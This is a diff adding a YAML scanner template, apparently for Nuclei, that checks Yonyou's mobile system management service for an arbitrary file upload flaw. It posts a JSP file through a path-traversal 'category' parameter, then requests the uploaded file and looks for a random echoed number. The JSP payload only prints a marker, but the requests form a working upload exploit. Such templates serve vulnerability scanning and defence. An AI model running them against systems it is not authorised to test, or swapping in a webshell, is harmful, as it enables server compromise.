@@ -1,0 +1,46 @@
+id: yonyou-common-upload-upload
+
+info:
+  name: 用友-移动系统管理-common-upload-upload
+  author: 用友-移动系统管理-common-upload-upload
+  severity: critical
+  tags: 用友
+variables:
+  r1: "{{rand_int(1000000, 9999999)}}"
+  r2: "{{rand_int(1000000, 9999999)}}"
+
+http:
+  - raw:
+      - |
+        POST /mobsm/common/upload?category=../webapps/nc_web/maupload/apk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
+        
+        <% out.println("{{r2}}");%>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+      - |
+        GET /maupload/apk/visitor/{{file}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - 'visitor/(.*?).jsp'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{r2}}")'
+        condition: and
